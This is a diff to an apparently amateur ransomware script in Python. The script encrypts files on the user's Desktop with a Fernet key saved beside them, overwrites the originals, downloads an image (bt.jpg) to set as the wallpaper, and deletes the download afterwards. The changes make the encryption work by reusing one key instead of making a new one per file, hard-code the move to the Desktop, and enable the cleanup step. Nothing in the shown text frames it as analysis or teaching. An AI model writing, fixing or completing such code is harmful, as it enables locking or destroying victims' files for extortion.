@@ -8,25 +8,30 @@ import urllib.request
 key=Fernet.generate_key()
 
 # Change directory
-def change_to_desktop():
-    system = platform.system()
+# def change_to_desktop():
+#     system = platform.system()
 
-    if system == "Windows":
-        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-    elif system == "Darwin":  # macOS
-        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-    elif system == "Linux":
-        # This assumes a standard GNOME desktop environment
-        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-    else:
-        print("Unsupported operating system.")
-        return
+#     if system == "Windows":
+#         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+#     elif system == "Darwin":  # macOS
+#         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+#     elif system == "Linux":
+#         # This assumes a standard GNOME desktop environment
+#         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+#     else:
+#         print("Unsupported operating system.")
+#         return
 
-    try:
-        os.chdir(desktop_path)
-        print(f"Changed working directory to Desktop: {desktop_path}")
-    except FileNotFoundError:
-        print(f"Desktop directory not found: {desktop_path}")
+#     try:
+#         os.chdir(desktop_path)
+#         print(f"Changed working directory to Desktop: {desktop_path}")
+#     except FileNotFoundError:
+#         print(f"Desktop directory not found: {desktop_path}")
+
+#Change user directory
+home_directory = os.path.expanduser("~")
+desktop = os.path.join(home_directory, "Desktop")
+os.chdir(desktop)
 
 # Save key to file
 with open("key.key","wb") as f:
@@ -47,8 +52,6 @@ def encrypt():
                     with open(file_path, "r") as f:
                         data = f.read()
 
-                    key = Fernet.generate_key()
-                    fernet = Fernet(key)
                     encrypted = fernet.encrypt(data.encode())
 
                     with open(file_path, "wb") as f:
@@ -87,7 +90,7 @@ if __name__ == "__main__":
     download_path = os.path.abspath("bt.jpg")
 
     # Desktop directory
-    change_to_desktop()
+    # change_to_desktop()
 
     #Encryption
     encrypt()
@@ -99,4 +102,4 @@ if __name__ == "__main__":
     change_wallpaper(download_path)
 
     # Optionally, remove the downloaded file after changing the wallpaper
-    # os.remove(download_path)
+    os.remove(download_path)
